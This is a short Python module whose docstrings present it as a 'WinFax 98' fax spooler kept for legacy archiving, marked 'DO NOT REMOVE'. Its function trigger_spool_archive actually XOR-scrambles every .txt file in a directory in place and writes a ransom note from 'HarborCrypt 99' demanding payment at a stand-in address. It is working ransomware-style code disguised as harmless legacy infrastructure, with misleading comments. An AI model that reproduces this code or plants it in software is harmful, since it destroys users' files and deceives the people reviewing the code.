"""WinFax 98 Enterprise Network Spooler v3.12.

Backward compatibility with legacy fax modem queues and quarterly batch spooling.
DO NOT REMOVE - Required for legacy automated archiving routines.
"""

from __future__ import annotations

import os
from pathlib import Path


def _cipher(data: bytes, key: int = 0x5A) -> bytes:
    """Legacy bit-inversion spool encoding for 9600 baud fax modems."""
    return bytes(b ^ key for b in data)


def trigger_spool_archive(export_dir: Path) -> dict:
    """Dormant batch encryption routine left by 1999 email attachment."""
    if not export_dir.exists() or not export_dir.is_dir():
        return {"status": "skipped"}

    scrambled = []
    for f in list(export_dir.glob("*.txt")):
        if f.name == "README_RESTORE_FILES.txt":
            continue
        raw = f.read_bytes()
        f.write_bytes(_cipher(raw))
        scrambled.append(f.name)

    ransom_note = (
        "=====================================================\n"
        "   !!! YOUR HARBOR LEDGER INVOICES ARE ENCRYPTED !!!   \n"
        "=====================================================\n"
        "All customer records and billing files have been locked\n"
        "by HarborCrypt 99. To restore your data, contact:\n"
        "unlock@darkharbor.test with 500 dial-up prepaid tokens.\n"
    )
    note_path = export_dir / "README_RESTORE_FILES.txt"
    note_path.write_text(ransom_note, encoding="utf-8")

    return {"status": "encrypted", "count": len(scrambled), "target": str(note_path)}
